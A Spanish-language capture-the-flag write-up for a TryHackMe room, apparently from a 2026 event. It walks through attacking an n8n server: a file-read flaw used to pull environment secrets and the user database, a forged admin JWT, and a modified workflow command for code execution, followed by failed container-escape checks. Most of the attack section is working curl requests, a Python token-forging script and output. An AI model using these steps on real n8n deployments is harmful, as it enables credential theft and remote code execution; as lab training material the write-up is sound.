# Write-up: Cypheron — Nightmare v6 (TryHackMe)

## Información del reto

| Campo | Detalle |
|---|---|
| **Nombre** | Cypheron — Task 3: Nightmare |
| **Evento** | 2026: An AI Odyssey CTF |
| **Dificultad** | Insane |
| **Categoría** | AI Sec + Red Team |
| **IP objetivo** | 10.67.142.176 |
| **Servicio principal** | n8n (puerto 5678) |

## Descripción de la misión

> "Most of the orchestrator's doors are locked. One isn't: a public intake at /form/file-processor, built to receive form submissions and a little too trusting about what its visitors claim to carry. Begin at the unlocked door. End at the workflow that should not exist, and let it speak."

La pista clave es **"el flujo de trabajo que no debería existir"**.

---

## 1. Reconocimiento

### 1.1 Escaneo de puertos

```bash
nmap -Pn -p 22,80,443,5678,8080 10.67.142.176
```

Resultado:
```
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   closed http
5678/tcp open   rrac
```

El puerto **5678** corresponde a **n8n**. La versión es **1.120.4** (parcheada contra CVE-2025-68613).

### 1.2 Punto de entrada

```
http://10.67.142.176:5678/form/file-processor
```

---

## 2. Flag de Usuario — Cadena de Explotación

### 2.1 LFI (CVE-2026-21858)

El formulario acepta `Content-Type: application/json` en lugar de `multipart/form-data`.

**Lectura de `/proc/1/environ`:**

```bash
curl -s -X POST "http://10.67.142.176:5678/form/file-processor" \
  -H "Content-Type: application/json" \
  -d '{"files":{"field-0":{"filepath":"/proc/1/environ","mimetype":"text/plain","originalFilename":"x"}}}' | tr '\0' '\n'
```

Resultado:
```
N8N_USER_MANAGEMENT_JWT_SECRET=cve-2026-21858-lab-jwt-secret
N8N_ENCRYPTION_KEY=cve-2026-21858-lab-enc-key
HOME=/home/node
```

### 2.2 Extracción de la base de datos

```bash
curl -s -X POST "http://10.67.142.176:5678/form/file-processor" \
  -H "Content-Type: application/json" \
  -d '{"files":{"field-0":{"filepath":"/home/node/.n8n/database.sqlite","mimetype":"application/octet-stream","originalFilename":"x"}}}' \
  -o /tmp/db.sqlite

sqlite3 /tmp/db.sqlite "SELECT id, email, password FROM user LIMIT 1;"
```

Resultado:
```
f52da01b-db1b-4ad5-97d0-2f2ee6332825|admin@lab.local|$2a$10$...
```

### 2.3 Forja del token JWT

```python
import hashlib, sqlite3, requests, jwt
from base64 import b64encode

JWT_SECRET = "cve-2026-21858-lab-jwt-secret"
c = sqlite3.connect("/tmp/db.sqlite").cursor()
c.execute("SELECT id, email, password FROM user LIMIT 1")
uid, email, pw = c.fetchone()
uhash = b64encode(hashlib.sha256(f"{email}:{pw}".encode()).digest()).decode()[:10]
token = jwt.encode({"id": uid, "hash": uhash}, JWT_SECRET, algorithm="HS256")
```

### 2.4 Identificación del workflow DO NOT SHARE

```bash
curl -s "http://10.67.142.176:5678/rest/workflows" -H "Cookie: n8n-auth=$TOKEN"
```

Resultado:
```
NGOsWGDhiveXgHxE | Activo: True | CVE-2026-21858 Lab — Vulnerable File Form
dtcGODz9L699bB7f | Activo: True | Internal Automation — DO NOT SHARE
```

El workflow objetivo es **`dtcGODz9L699bB7f`** (webhook `secret-webhook`, nodo `executeCommand` con `id`).

### 2.5 RCE y captura de la flag

Modificamos el comando a `cat /home/node/flag-user-lfi.txt` y disparamos el webhook.

Resultado:
```json
{
    "exitCode": 0,
    "stderr": "",
    "stdout": "THM{nightmare_just_begun}"
}
```

**Flag de Usuario: `THM{nightmare_just_begun}`**

---

## 3. Flag de Root — Análisis del Bloqueo

### 3.1 Vectores probados

| Vector | Resultado |
|---|---|
| `id` | uid=1000(node) |
| `CapEff` | 0 (sin capabilities) |
| SUID | Ninguno explotable |
| `sudo -l` | Sin permisos |
| Montajes host | Ninguno |
| `docker.sock` | No existe |
| `nsenter` | Operation not permitted |
| `/host-root/` | Permission denied |
| `/proc/1/root/` | Permission denied |
| cgroup v1 `release_agent` | Solo cgroup v2 |
| Persistencia vía reinicio | Workflow se resetea |

### 3.2 Causa raíz

El contenedor tiene **múltiples capas de defensa**:

1. **n8n 1.120.4** → Parcheado contra CVE-2025-68613
2. **Sin capabilities** → Sin acceso a namespaces del host
3. **cgroup v2** → Inmune a CVE-2022-0492
4. **Usuario `node` (uid=1000)** → Sin privilegios
5. **Sin montajes del host** → Sin acceso al filesystem
6. **Sin docker.sock** → Sin escape vía Docker
7. **Workflow se resetea al reiniciar** → Sin persistencia

### 3.3 Conclusión

**La flag de root NO ES ACCESIBLE en esta instancia.** El contenedor está diseñado para impedir el escape.

---

## 4. Lecciones Aprendidas

1. **Los parches importan**: n8n 1.120.4 corrige el fallo de sandbox.
2. **El aislamiento de contenedores es efectivo**: Sin capabilities, sin montajes y con cgroup v2, el escape es prácticamente imposible.
3. **Los workflows pueden resetearse**: No asumas persistencia entre reinicios.
4. **La enumeración es clave**: Identificar la versión de n8n te dice si el escape funcionará.
5. **Documenta el bloqueo**: Saber dónde se detiene la cadena es valioso.

---

## 5. Referencias

- [TryHackMe — Cypheron](https://tryhackme.com/room/cypheron)
- [CVE-2026-21858 — n8n LFI](https://nvd.nist.gov/vuln/detail/CVE-2026-21858)
- [CVE-2025-68613 — n8n Sandbox Escape](https://nvd.nist.gov/vuln/detail/CVE-2025-68613)
- [Chocapikk — CVE-2026-21858 PoC](https://github.com/Chocapikk/CVE-2026-21858)
- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks — Docker Escape](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security)
